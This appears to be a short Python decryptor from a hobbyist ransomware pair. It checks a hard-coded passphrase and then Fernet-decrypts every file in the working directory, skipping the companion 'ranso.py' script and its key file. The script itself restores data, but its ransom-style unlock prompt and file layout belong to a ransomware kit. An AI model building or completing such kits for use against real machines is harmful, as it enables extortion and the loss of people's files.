import os

from cryptography.fernet import Fernet


files = []

for file in os.listdir():
	if file == "ranso.py" or file == "thekey.key" or file =="deranso.py":
		continue 
	if os.path.isfile(file):
		files.append(file)
print(files)


with open("thekey.key", "rb") as key:
	secretkey = key.read() 

secretphrase = "GHOST"
user_phrase = input("Enter the Secret Key to Decrypt your Files: ")

if user_phrase == secretphrase:
	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
	print("Lets goo your all Files are Decrypted, Enjoy :)")
else:
	print("Sorry, Wrong Secretkey")
